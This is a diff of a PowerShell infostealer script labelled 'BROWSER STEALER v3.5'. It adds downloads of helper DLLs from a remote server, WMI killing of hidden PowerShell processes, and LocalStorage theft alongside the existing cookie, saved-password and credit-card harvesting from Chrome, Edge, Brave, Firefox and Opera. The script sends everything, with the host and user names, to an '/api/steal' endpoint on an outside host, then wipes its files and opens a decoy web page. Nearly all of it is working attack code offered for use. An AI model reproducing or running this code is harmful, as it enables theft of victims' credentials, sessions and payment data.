@@ -1,15 +1,33 @@
 # ============================================================
-# BROWSER STEALER v3.2 — COMPLETE WORKING VERSION
-# Sends credentials (username/email + password) to dashboard
-# Includes url links for credentials and cards
+# BROWSER STEALER v3.5 — SERVER-ONLY LEVELDB
+# All DLLs downloaded from your server
+# Sends: Cookies, Passwords, Cards, LocalStorage (all browsers)
+# WMI cleanup — kills previous hidden PowerShell processes
 # No Read-Host — exits cleanly
 # ============================================================
 
 $ErrorActionPreference = "Continue"
-$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"
+
+# ============================================================
+# CONFIGURATION — CHANGE THIS TO YOUR DOMAIN
+# ============================================================
+
+$BASE_URL = "https://cipheranon-production.up.railway.app/"  # <-- CHANGE THIS
+$SERVER_URL = "$BASE_URL/api/steal"
+$DLL_DIR = "$env:TEMP\stealer_dlls"
 $LOGFILE = "$env:TEMP\stealer_log.txt"
 
+# DLL URLs — all from your server
+$SQLITE_DLL_URL = "$BASE_URL/System.Data.SQLite.dll"
+$LEVELDB_DLL_URL = "$BASE_URL/LevelDB.NET.dll"
+$LEVELDB_NATIVE_URL = "$BASE_URL/leveldb.dll"
+
+# ============================================================
+# INIT
+# ============================================================
+
 Remove-Item $LOGFILE -Force -ErrorAction SilentlyContinue
+New-Item -ItemType Directory -Path $DLL_DIR -Force -ErrorAction SilentlyContinue | Out-Null
 
 function Write-Log {
     param($Msg)
@@ -20,47 +38,94 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "  BROWSER STEALER v3.2"
+Write-Log "  BROWSER STEALER v3.5 — SERVER-ONLY"
 Write-Log "  Target: $env:COMPUTERNAME"
 Write-Log "  Log: $LOGFILE"
+Write-Log "  Base URL: $BASE_URL"
 Write-Log "============================================"
 Write-Log ""
 
 # ============================================================
-# DOWNLOAD SQLITE DLL
+# WMI CLEANUP — KILL PREVIOUS HIDDEN PROCESSES
 # ============================================================
 
-$dllPath = "$env:TEMP\System.Data.SQLite.dll"
-
-if (Test-Path $dllPath) {
-    Write-Log "[+] Removing old DLL"
-    Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
-}
-
-$dllUrl = "https://cipheranon-production.up.railway.app/System.Data.SQLite.dll"
-Write-Log "[+] Downloading SQLite DLL from: $dllUrl"
+Write-Log "[+] WMI — Scanning for previous hidden PowerShell processes..."
 
 try {
-    $response = Invoke-WebRequest -Uri $dllUrl -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing
-    [System.IO.File]::WriteAllBytes($dllPath, $response.Content)
-    Write-Log "[+] Downloaded successfully"
+    $processes = Get-WmiObject Win32_Process -Filter "Name = 'powershell.exe'"
+    $killed = 0
+    
+    foreach ($p in $processes) {
+        $pid = $p.ProcessId
+        $cmdLine = $p.CommandLine
+        
+        if ($cmdLine -match "-w hidden" -or $cmdLine -match "-WindowStyle Hidden" -or $cmdLine -match "-w h") {
+            try {
+                $p.Terminate() | Out-Null
+                Write-Log "  [+] Killed hidden process: PID $pid"
+                $killed++
+            } catch {
+                Write-Log "  [!] Failed to kill PID $pid"
+            }
+        }
+    }
+    
+    if ($killed -gt 0) {
+        Write-Log "[+] Killed $killed hidden PowerShell processes"
+        Start-Sleep -Seconds 1
+    } else {
+        Write-Log "[+] No hidden processes found"
+    }
 } catch {
-    Write-Log "[!] Download failed: $_"
-    Write-Log "[!] Make sure System.Data.SQLite.dll is in your public folder"
+    Write-Log "[!] WMI cleanup failed: $_"
+}
+
+Write-Log ""
+
+# ============================================================
+# DOWNLOAD DLLs — ALL FROM YOUR SERVER
+# ============================================================
+
+function Download-Dll {
+    param($Url, $Path, $Name)
+    
+    Write-Log "[+] Downloading $Name from: $Url"
+    
+    try {
+        $response = Invoke-WebRequest -Uri $Url -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing
+        [System.IO.File]::WriteAllBytes($Path, $response.Content)
+        Write-Log "[+] $Name downloaded successfully ($($response.Content.Length) bytes)"
+        return $true
+    } catch {
+        Write-Log "[!] $Name download failed: $_"
+        return $false
+    }
+}
+
+# ---- Download SQLite DLL ----
+$sqlitePath = "$DLL_DIR\System.Data.SQLite.dll"
+$sqliteOk = Download-Dll -Url $SQLITE_DLL_URL -Path $sqlitePath -Name "SQLite DLL"
+
+if (-not $sqliteOk -or -not (Test-Path $sqlitePath)) {
+    Write-Log "[!] SQLite DLL required — exiting"
     exit
 }
 
-if (-not (Test-Path $dllPath)) {
-    Write-Log "[!] DLL not found after download"
-    exit
-}
+# ---- Download LevelDB.NET DLL ----
+$leveldbPath = "$DLL_DIR\LevelDB.NET.dll"
+$leveldbOk = Download-Dll -Url $LEVELDB_DLL_URL -Path $leveldbPath -Name "LevelDB.NET DLL"
 
-$fileSize = (Get-Item $dllPath).Length
-Write-Log "[+] File size: $fileSize bytes"
+# ---- Download Native LevelDB DLL ----
+$leveldbNativePath = "$DLL_DIR\leveldb.dll"
+$nativeOk = Download-Dll -Url $LEVELDB_NATIVE_URL -Path $leveldbNativePath -Name "Native LevelDB DLL"
 
-if ($fileSize -lt 50000) {
-    Write-Log "[!] DLL is too small - not a valid DLL"
-    exit
+# Check if LevelDB is available
+$leveldbLoaded = $false
+if ($leveldbOk -and $nativeOk -and (Test-Path $leveldbPath) -and (Test-Path $leveldbNativePath)) {
+    Write-Log "[+] LevelDB DLLs available"
+    $leveldbLoaded = $true
+} else {
+    Write-Log "[!] LevelDB not available — LocalStorage for Chrome/Edge/Brave will be skipped"
 }
 
 # ============================================================
@@ -69,10 +134,10 @@ if ($fileSize -lt 50000) {
 
 Write-Log "[+] Loading SQLite DLL..."
 try {
-    [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
+    [System.Reflection.Assembly]::LoadFrom($sqlitePath) | Out-Null
     Write-Log "[+] SQLite loaded successfully!"
 } catch {
-    Write-Log "[!] Failed to load DLL: $_"
+    Write-Log "[!] Failed to load SQLite DLL: $_"
     exit
 }
 
@@ -85,6 +150,23 @@ try {
 } catch {
     Write-Log "[!] SQLite test failed: $_"
     exit
+}
+
+# ============================================================
+# LOAD LEVELDB DLL (if available)
+# ============================================================
+
+if ($leveldbLoaded) {
+    Write-Log "[+] Loading LevelDB DLLs..."
+    try {
+        [System.Reflection.Assembly]::LoadFrom($leveldbPath) | Out-Null
+        Write-Log "[+] LevelDB loaded successfully!"
+    } catch {
+        Write-Log "[!] Failed to load LevelDB: $_"
+        $leveldbLoaded = $false
+    }
+} else {
+    Write-Log "[!] LevelDB DLLs not available — skipping Chrome/Edge/Brave LocalStorage"
 }
 
 # ============================================================
@@ -211,7 +293,74 @@ function Get-FirefoxCookies {
 }
 
 # ============================================================
-# PASSWORD FUNCTIONS — WITH URL FIELD
+# LOCALSTORAGE FUNCTIONS
+# ============================================================
+
+function Get-FirefoxLocalStorage {
+    param($ProfPath)
+    $storage = @{}
+    $dbPath = "$ProfPath\webappsstore.sqlite"
+    
+    if (Test-Path $dbPath) {
+        try {
+            $rows = Read-SQLite -DbPath $dbPath -Query "SELECT scope, key, value FROM webappsstore2"
+            foreach ($r in $rows) {
+                if ($r['key'] -and $r['value']) {
+                    $storage[$r['key']] = $r['value']
+                }
+            }
+            Write-Log "[+] Firefox LocalStorage: $($storage.Count) items"
+        } catch {
+            Write-Log "[!] Error reading Firefox LocalStorage"
+        }
+    }
+    return $storage
+}
+
+function Get-ChromeLocalStorage {
+    param($Path, $Name)
+    $storage = @{}
+    
+    if (-not $leveldbLoaded) {
+        return $storage
+    }
+    
+    $leveldbPath = "$Path\Local Storage\leveldb\"
+    if (-not (Test-Path $leveldbPath)) {
+        $leveldbPath = "$Path\Local Storage\leveldb"
+        if (-not (Test-Path $leveldbPath)) {
+            return $storage
+        }
+    }
+    
+    Write-Log "[+] Reading $Name LocalStorage..."
+    
+    try {
+        $options = New-Object LevelDB.NET.Options
+        $db = [LevelDB.NET.DB]::Open($leveldbPath, $options)
+        
+        $iterator = $db.CreateIterator()
+        $iterator.SeekToFirst()
+        
+        while ($iterator.Next()) {
+            $key = [System.Text.Encoding]::UTF8.GetString($iterator.Key())
+            $value = [System.Text.Encoding]::UTF8.GetString($iterator.Value())
+            $storage[$key] = $value
+        }
+        
+        $iterator.Dispose()
+        $db.Dispose()
+        
+        Write-Log "[+] $Name LocalStorage: $($storage.Count) items"
+    } catch {
+        Write-Log "[!] Error reading $Name LocalStorage: $_"
+    }
+    
+    return $storage
+}
+
+# ============================================================
+# PASSWORD FUNCTIONS
 # ============================================================
 
 function Get-BrowserPasswords {
@@ -239,12 +388,10 @@ function Get-BrowserPasswords {
                 $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($encryptedPassword)
             }
             
-            # Only add if we have both username and password
             if ($username -and $decryptedPassword -and $username -ne "" -and $decryptedPassword -ne "") {
                 $u = $r['origin_url']
                 if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                 
-                # ---- FORMAT: {name, value, type, url} for dashboard ----
                 $pass += @{
                     name = $username
                     value = $decryptedPassword
@@ -275,7 +422,6 @@ function Get-FirefoxPasswords {
                     if ($json.logins) {
                         foreach ($l in $json.logins) {
                             $u = $l.hostname -replace 'https?://', ''
-                            # ---- FORMAT: {name, value, type, url} ----
                             if ($l.username -and $l.password -and $l.username -ne "" -and $l.password -ne "") {
                                 $pass += @{
                                     name = $l.username
@@ -306,7 +452,7 @@ function Get-OperaPasswords {
 }
 
 # ============================================================
-# CREDIT CARD FUNCTIONS — WITH URL FIELD
+# CREDIT CARD FUNCTIONS
 # ============================================================
 
 function Get-BrowserCards {
@@ -318,12 +464,11 @@ function Get-BrowserCards {
         $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
         foreach ($r in $rows) {
             if ($r['name_on_card'] -and $r['card_number_encrypted']) {
-                # ---- FORMAT: {name, value, type, url} ----
                 $cards += @{
                     name = $r['name_on_card']
                     value = $r['card_number_encrypted']
                     type = "card-number"
-                    url = $Name  # Use browser name as fallback domain
+                    url = $Name
                     browser = $Name
                     month = $r['expiration_month']
                     year = $r['expiration_year']
@@ -337,12 +482,29 @@ function Get-BrowserCards {
 }
 
 # ============================================================
+# GET FIREFOX PROFILES
+# ============================================================
+
+function Get-FirefoxProfiles {
+    $profiles = @()
+    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    if (Test-Path $profPath) {
+        $dirs = Get-ChildItem $profPath -Directory
+        foreach ($d in $dirs) {
+            $profiles += $d.FullName
+        }
+    }
+    return $profiles
+}
+
+# ============================================================
 # STEAL EVERYTHING
 # ============================================================
 
 $allCookies = @()
 $allPasswords = @()
 $allCards = @()
+$allLocalStorage = @{}
 
 Write-Log ""
 Write-Log "[+] Chrome cookies..."
@@ -395,6 +557,41 @@ $path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Dat
 $allCards += Get-BrowserCards -Path $path -Name "Brave"
 
 # ============================================================
+# LOCALSTORAGE — ALL BROWSERS
+# ============================================================
+
+Write-Log ""
+Write-Log "[+] Chrome LocalStorage..."
+$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+$chromeLs = Get-ChromeLocalStorage -Path $path -Name "Chrome"
+foreach ($key in $chromeLs.Keys) {
+    $allLocalStorage["Chrome:$key"] = $chromeLs[$key]
+}
+
+Write-Log "[+] Edge LocalStorage..."
+$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+$edgeLs = Get-ChromeLocalStorage -Path $path -Name "Edge"
+foreach ($key in $edgeLs.Keys) {
+    $allLocalStorage["Edge:$key"] = $edgeLs[$key]
+}
+
+Write-Log "[+] Brave LocalStorage..."
+$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
+$braveLs = Get-ChromeLocalStorage -Path $path -Name "Brave"
+foreach ($key in $braveLs.Keys) {
+    $allLocalStorage["Brave:$key"] = $braveLs[$key]
+}
+
+Write-Log "[+] Firefox LocalStorage..."
+$profiles = Get-FirefoxProfiles
+foreach ($prof in $profiles) {
+    $ffLs = Get-FirefoxLocalStorage -ProfPath $prof
+    foreach ($key in $ffLs.Keys) {
+        $allLocalStorage["Firefox:$key"] = $ffLs[$key]
+    }
+}
+
+# ============================================================
 # SUMMARY
 # ============================================================
 
@@ -402,9 +599,10 @@ Write-Log ""
 Write-Log "============================================"
 Write-Log "  SUMMARY"
 Write-Log "============================================"
-Write-Log "Cookies:    $($allCookies.Count)"
-Write-Log "Passwords:  $($allPasswords.Count)"
-Write-Log "Cards:      $($allCards.Count)"
+Write-Log "Cookies:        $($allCookies.Count)"
+Write-Log "Passwords:      $($allPasswords.Count)"
+Write-Log "Cards:          $($allCards.Count)"
+Write-Log "LocalStorage:   $($allLocalStorage.Count)"
 Write-Log "============================================"
 Write-Log ""
 
@@ -434,17 +632,27 @@ if ($allCards.Count -gt 0) {
     Write-Log ""
 }
 
-if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count -eq 0) {
+if ($allLocalStorage.Count -gt 0) {
+    Write-Log "=== SAMPLE LOCALSTORAGE (First 3) ==="
+    $allLocalStorage.GetEnumerator() | Select-Object -First 3 | ForEach-Object {
+        $shortVal = $_.Value
+        if ($shortVal.Length -gt 30) { $shortVal = $shortVal.Substring(0, 30) + "..." }
+        Write-Log "  $($_.Key) = $shortVal"
+    }
+    Write-Log ""
+}
+
+if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count -eq 0 -and $allLocalStorage.Count -eq 0) {
     Write-Log "[!] No data stolen"
     Write-Log "[*] Possible reasons:"
-    Write-Log "   - No saved passwords/cookies in browsers"
+    Write-Log "   - No saved data in browsers"
     Write-Log "   - Browser is running (locks the database)"
     Write-Log "   - Close the browser and try again"
     Write-Log ""
 }
 
 # ============================================================
-# BUILD PAYLOAD — WITH URL FIELDS
+# BUILD PAYLOAD
 # ============================================================
 
 $pcName = $env:COMPUTERNAME
@@ -460,16 +668,17 @@ foreach ($c in $allCookies) {
     $cookiesForServer[$key][$c.name] = $c.value
 }
 
-# ---- Credentials already have {name, value, type, url} ----
-$credentialsForServer = $allPasswords
-
-# ---- Cards already have {name, value, type, url} ----
-$cardsForServer = $allCards
+# ---- Convert LocalStorage to simple format ----
+$localStorageForServer = @{}
+foreach ($key in $allLocalStorage.Keys) {
+    $localStorageForServer[$key] = $allLocalStorage[$key]
+}
 
 $payload = @{
     cookies = $cookiesForServer
-    credentials = $credentialsForServer
-    cards = $cardsForServer
+    credentials = $allPasswords
+    cards = $allCards
+    localStorage = $localStorageForServer
     system = @{
         hostname = $pcName
         username = $userName
@@ -518,6 +727,7 @@ try {
 # ============================================================
 
 Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+Remove-Item $DLL_DIR -Recurse -Force -ErrorAction SilentlyContinue
 
 Start-Process "https://www.google.com"
 
@@ -526,5 +736,5 @@ Write-Log "[+] Done!"
 Write-Log "[+] Log saved to: $LOGFILE"
 Write-Log ""
 
-# ---- EXIT CLEANLY — NO Read-Host ----
+# ---- EXIT CLEANLY ----
 exit
